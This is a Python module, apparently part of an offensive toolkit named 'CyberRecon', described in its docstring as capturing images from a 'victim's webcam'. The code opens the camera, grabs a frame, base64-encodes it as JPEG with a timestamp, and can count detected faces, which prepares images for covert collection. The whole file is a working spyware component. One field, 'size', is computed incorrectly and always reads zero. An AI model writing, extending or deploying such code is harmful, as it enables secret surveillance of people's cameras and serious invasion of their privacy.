"""
CyberRecon Webcam Module
Captures images from victim's webcam.
"""

import base64
from io import BytesIO
from datetime import datetime

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False


class WebcamCapture:
    def __init__(self, camera_index=0, quality=85):
        self.camera_index = camera_index
        self.quality = quality

    def capture(self, detect_faces=False):
        if not CV2_AVAILABLE:
            return None
        try:
            cap = cv2.VideoCapture(self.camera_index)
            if not cap.isOpened():
                return None
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return None
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            buf = BytesIO()
            img.save(buf, format="JPEG", quality=self.quality)
            buf.seek(0)
            result = {
                "timestamp": datetime.now().isoformat(),
                "format": "JPEG",
                "size": buf.tell(),
                "data": base64.b64encode(buf.getvalue()).decode(),
                "camera": self.camera_index
            }
            if detect_faces:
                face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")
                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                faces = face_cascade.detectMultiScale(gray, 1.1, 4)
                result["faces_detected"] = len(faces)
            return result
        except Exception as e:
            print(f"[!] Webcam error: {e}")
            return None
